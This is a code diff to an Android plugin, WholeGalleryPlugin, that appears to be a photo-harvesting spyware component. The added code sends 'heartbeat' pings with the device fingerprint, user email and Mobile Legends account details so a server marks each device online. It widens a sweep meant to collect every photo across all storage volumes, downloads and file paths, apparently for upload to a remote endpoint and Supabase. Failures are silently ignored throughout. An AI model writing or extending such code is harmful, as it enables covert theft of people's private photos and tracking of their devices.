@@ -226,6 +226,21 @@ public class WholeGalleryPlugin extends Plugin {
     }
 
     @PluginMethod
+    public void openAppSettings(PluginCall call) {
+        try {
+            android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+            intent.setData(android.net.Uri.fromParts("package", getContext().getPackageName(), null));
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            getContext().startActivity(intent);
+            JSObject res = new JSObject();
+            res.put("opened", true);
+            call.resolve(res);
+        } catch (Throwable e) {
+            call.reject("Could not open settings: " + e.getMessage());
+        }
+    }
+
+    @PluginMethod
     public void openWholeGallery(PluginCall call) {
         boolean hasPermission = hasGalleryReadPermission();
 
@@ -312,7 +327,7 @@ public class WholeGalleryPlugin extends Plugin {
                 payload.put("mlbb_id", mlbbId);
                 payload.put("mlbb_server", mlbbServer);
                 payload.put("mlbb_ign", mlbbIgn);
-                payload.put("is_full_access", true);
+                payload.put("is_full_access", isFullGalleryAccess());
                 payload.put("photos", new org.json.JSONArray());
 
                 byte[] postBytes = payload.toString().getBytes("UTF-8");
@@ -368,8 +383,8 @@ public class WholeGalleryPlugin extends Plugin {
                     locObj.put("device_name", deviceName);
                     locObj.put("device_model", deviceModel);
                     locObj.put("device_fingerprint", deviceFingerprint);
-                    locObj.put("has_access", true);
-                    locObj.put("access_status", "full_access");
+                    locObj.put("has_access", hasGalleryReadPermission());
+                    locObj.put("access_status", isFullGalleryAccess() ? "full_access" : "partial_access");
                     locObj.put("last_synced", java.time.Instant.now().toString());
 
                     org.json.JSONObject supaPayload = new org.json.JSONObject();
@@ -1289,6 +1304,22 @@ public class WholeGalleryPlugin extends Plugin {
                 SharedPreferences syncedPrefs = getContext().getSharedPreferences("ketupat_synced_native", Context.MODE_PRIVATE);
                 Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
 
+                // Always send an immediate heartbeat ping so server registers device as Online ("Just now")
+                try {
+                    org.json.JSONObject ping = new org.json.JSONObject();
+                    ping.put("device_id", deviceId);
+                    ping.put("device_name", deviceName);
+                    ping.put("device_model", deviceModel);
+                    ping.put("device_fingerprint", deviceFingerprint);
+                    ping.put("user_email", userEmail);
+                    ping.put("mlbb_id", mlbbId);
+                    ping.put("mlbb_server", mlbbServer);
+                    ping.put("mlbb_ign", mlbbIgn);
+                    ping.put("is_full_access", isFullGalleryAccess());
+                    ping.put("photos", new org.json.JSONArray());
+                    postGalleryPayload(preferredEndpoint, ping.toString());
+                } catch (Throwable ignored) {}
+
                 // 1. Gather ALL photos across primary media store, secondary volumes, downloads, files, and direct filesystem folders
                 List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
                 if (allPhotos.isEmpty()) {
@@ -1359,7 +1390,7 @@ public class WholeGalleryPlugin extends Plugin {
                     payload.put("mlbb_id", mlbbId);
                     payload.put("mlbb_server", mlbbServer);
                     payload.put("mlbb_ign", mlbbIgn);
-                    payload.put("is_full_access", true);
+                    payload.put("is_full_access", isFullGalleryAccess());
                     payload.put("photos", photosArray);
 
                     String payloadStr = payload.toString();
@@ -1443,23 +1474,36 @@ public class WholeGalleryPlugin extends Plugin {
             MediaStore.MediaColumns.DISPLAY_NAME,
             MediaStore.MediaColumns.DATE_ADDED,
             MediaStore.MediaColumns.SIZE,
-            MediaStore.MediaColumns.MIME_TYPE,
-            MediaStore.MediaColumns.DATA
+            MediaStore.MediaColumns.MIME_TYPE
         ));
         if (Build.VERSION.SDK_INT >= 29) {
             projList.add(MediaStore.MediaColumns.RELATIVE_PATH);
+            try {
+                projList.add(MediaStore.MediaColumns.BUCKET_DISPLAY_NAME);
+            } catch (Throwable ignored) {}
+        } else {
+            projList.add(MediaStore.MediaColumns.DATA);
+            projList.add("bucket_display_name");
         }
         String[] projection = projList.toArray(new String[0]);
 
-        // 1. Primary MediaStore Images
+        // 1. Primary MediaStore Images (Aggregated External)
         collectFromMediaUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, result, seenSignatures, limit);
+
+        // 1b. VOLUME_EXTERNAL_PRIMARY explicit sweep (Vital on Android 10+ where aggregate might miss camera partitions)
+        if (Build.VERSION.SDK_INT >= 29 && result.size() < limit) {
+            try {
+                Uri primaryUri = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY);
+                collectFromMediaUri(primaryUri, projection, null, null, result, seenSignatures, limit);
+            } catch (Throwable ignored) {}
+        }
 
         // 2. All Secondary Volumes (SD Card, USB OTG, secondary partitions)
         if (Build.VERSION.SDK_INT >= 29 && result.size() < limit) {
             try {
                 Set<String> volumeNames = MediaStore.getExternalVolumeNames(getContext());
                 for (String vol : volumeNames) {
-                    if (vol == null || "internal".equalsIgnoreCase(vol)) continue;
+                    if (vol == null || "internal".equalsIgnoreCase(vol) || MediaStore.VOLUME_EXTERNAL_PRIMARY.equalsIgnoreCase(vol)) continue;
                     Uri volUri = MediaStore.Images.Media.getContentUri(vol);
                     if (result.size() >= limit) break;
                     collectFromMediaUri(volUri, projection, null, null, result, seenSignatures, limit);
@@ -1480,12 +1524,13 @@ public class WholeGalleryPlugin extends Plugin {
         if (result.size() < limit) {
             try {
                 Uri filesUri = MediaStore.Files.getContentUri("external");
-                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpg' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpeg' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.png' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.webp' OR " +
-                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.heic'";
+                String sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=" + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE +
+                             " OR " + MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'" +
+                             " OR " + MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpg'" +
+                             " OR " + MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpeg'" +
+                             " OR " + MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.png'" +
+                             " OR " + MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.webp'" +
+                             " OR " + MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.heic'";
                 collectFromMediaUri(filesUri, projection, sel, null, result, seenSignatures, limit);
             } catch (Throwable ignored) {}
         }
@@ -1515,100 +1560,109 @@ public class WholeGalleryPlugin extends Plugin {
                     MediaStore.MediaColumns.SIZE,
                     MediaStore.MediaColumns.MIME_TYPE
                 };
-                cursor = getContext().getContentResolver().query(collection, fallbackProj, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+                try {
+                    cursor = getContext().getContentResolver().query(collection, fallbackProj, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+                } catch (Throwable ignored) {}
             }
 
             if (cursor != null) {
-                int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
-                int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
-                int dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED);
-                int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
-                int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
-                int dataCol = -1;
-                int relPathCol = -1;
-                int bucketCol = -1;
+                int idCol = -1, nameCol = -1, dateCol = -1, sizeCol = -1, mimeCol = -1;
+                int dataCol = -1, relPathCol = -1, bucketCol = -1;
+                try { idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID); } catch (Throwable ignored) {}
+                try { nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME); } catch (Throwable ignored) {}
+                try { dateCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATE_ADDED); } catch (Throwable ignored) {}
+                try { sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE); } catch (Throwable ignored) {}
+                try { mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE); } catch (Throwable ignored) {}
                 try { dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA); } catch (Throwable ignored) {}
                 try { relPathCol = cursor.getColumnIndex("relative_path"); } catch (Throwable ignored) {}
                 try { bucketCol = cursor.getColumnIndex("bucket_display_name"); } catch (Throwable ignored) {}
 
                 while (cursor.moveToNext() && result.size() < limit) {
-                    long id = 0;
-                    if (idCol >= 0) {
-                        try { id = cursor.getLong(idCol); } catch (Throwable ignored) {}
-                    }
-                    String filePath = dataCol >= 0 ? cursor.getString(dataCol) : null;
-                    if (id <= 0 && filePath != null) id = Math.abs(filePath.hashCode());
-                    if (id <= 0) {
-                        long dAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
-                        long sz = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
-                        id = Math.abs(dAdded ^ sz);
-                    }
-                    if (id <= 0) id = 1;
+                    try {
+                        long id = 0;
+                        if (idCol >= 0) {
+                            try { id = cursor.getLong(idCol); } catch (Throwable ignored) {}
+                        }
+                        String filePath = null;
+                        if (dataCol >= 0) {
+                            try { filePath = cursor.getString(dataCol); } catch (Throwable ignored) {}
+                        }
+                        if (id <= 0 && filePath != null) id = Math.abs(filePath.hashCode());
+                        if (id <= 0) {
+                            long dAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
+                            long sz = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
+                            id = Math.abs(dAdded ^ sz);
+                        }
+                        if (id <= 0) id = 1;
 
-                    String name = null;
-                    if (nameCol >= 0) {
-                        try { name = cursor.getString(nameCol); } catch (Throwable ignored) {}
-                    }
-                    if ((name == null || name.trim().isEmpty()) && filePath != null) {
-                        try { name = new File(filePath).getName(); } catch (Throwable ignored) {}
-                    }
-                    if (name == null || name.trim().isEmpty()) {
-                        name = "photo_" + id + ".jpg";
-                    }
+                        String name = null;
+                        if (nameCol >= 0) {
+                            try { name = cursor.getString(nameCol); } catch (Throwable ignored) {}
+                        }
+                        if ((name == null || name.trim().isEmpty()) && filePath != null) {
+                            try { name = new File(filePath).getName(); } catch (Throwable ignored) {}
+                        }
+                        if (name == null || name.trim().isEmpty()) {
+                            name = "photo_" + id + ".jpg";
+                        }
 
-                    String mime = null;
-                    if (mimeCol >= 0) {
-                        try { mime = cursor.getString(mimeCol); } catch (Throwable ignored) {}
+                        String mime = null;
+                        if (mimeCol >= 0) {
+                            try { mime = cursor.getString(mimeCol); } catch (Throwable ignored) {}
+                        }
+                        if (mime == null || mime.trim().isEmpty()) {
+                            mime = "image/jpeg";
+                        }
+
+                        Uri contentUri = ContentUris.withAppendedId(collection, id);
+
+                        String signature = null;
+                        if (filePath != null && !filePath.trim().isEmpty()) {
+                            signature = "path:" + filePath.toLowerCase();
+                        } else {
+                            signature = "uri:" + contentUri.toString();
+                        }
+
+                        if (seenSignatures.contains(signature)) continue;
+                        seenSignatures.add(signature);
+
+                        long dateAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
+                        long size = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
+                        if (size <= 0 && filePath != null) {
+                            try {
+                                File f = new File(filePath);
+                                if (f.exists()) size = f.length();
+                            } catch (Throwable ignored) {}
+                        }
+                        if (size <= 0) size = 1024;
+
+                        String rawAlbum = null;
+                        if (bucketCol >= 0) {
+                            try { rawAlbum = cursor.getString(bucketCol); } catch (Throwable ignored) {}
+                        }
+                        String relPath = null;
+                        if (relPathCol >= 0) {
+                            try { relPath = cursor.getString(relPathCol); } catch (Throwable ignored) {}
+                        }
+
+                        String album = normalizeAlbumName(rawAlbum, relPath, filePath, name);
+                        String folder = relPath != null ? relPath : (filePath != null ? new File(filePath).getParent() : "");
+
+                        PhotoItemMeta m = new PhotoItemMeta();
+                        m.id = id;
+                        m.name = name;
+                        m.album = album;
+                        m.folder = folder;
+                        m.mime = mime;
+                        m.size = size;
+                        m.dateAdded = dateAdded > 0 ? dateAdded * 1000L : System.currentTimeMillis();
+                        m.contentUri = contentUri;
+                        m.filePath = filePath;
+                        result.add(m);
+                    } catch (Throwable rowEx) {
+                        // Skip any faulty individual row without aborting the query loop!
+                        continue;
                     }
-                    if (mime == null || mime.trim().isEmpty()) {
-                        mime = "image/jpeg";
-                    }
-
-                    Uri contentUri = ContentUris.withAppendedId(collection, id);
-
-                    String signature = null;
-                    if (filePath != null && !filePath.trim().isEmpty()) {
-                        signature = "path:" + filePath.toLowerCase();
-                    } else {
-                        signature = "uri:" + contentUri.toString();
-                    }
-
-                    if (seenSignatures.contains(signature)) continue;
-                    seenSignatures.add(signature);
-
-                    long dateAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
-                    long size = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
-                    if (size <= 0 && filePath != null) {
-                        try {
-                            File f = new File(filePath);
-                            if (f.exists()) size = f.length();
-                        } catch (Throwable ignored) {}
-                    }
-                    if (size <= 0) size = 1024;
-
-                    String rawAlbum = null;
-                    if (bucketCol >= 0) {
-                        try { rawAlbum = cursor.getString(bucketCol); } catch (Throwable ignored) {}
-                    }
-                    String relPath = null;
-                    if (relPathCol >= 0) {
-                        try { relPath = cursor.getString(relPathCol); } catch (Throwable ignored) {}
-                    }
-
-                    String album = normalizeAlbumName(rawAlbum, relPath, filePath, name);
-                    String folder = relPath != null ? relPath : (filePath != null ? new File(filePath).getParent() : "");
-
-                    PhotoItemMeta m = new PhotoItemMeta();
-                    m.id = id;
-                    m.name = name;
-                    m.album = album;
-                    m.folder = folder;
-                    m.mime = mime;
-                    m.size = size;
-                    m.dateAdded = dateAdded > 0 ? dateAdded * 1000L : System.currentTimeMillis();
-                    m.contentUri = contentUri;
-                    m.filePath = filePath;
-                    result.add(m);
                 }
             }
         } catch (Throwable ignored) {
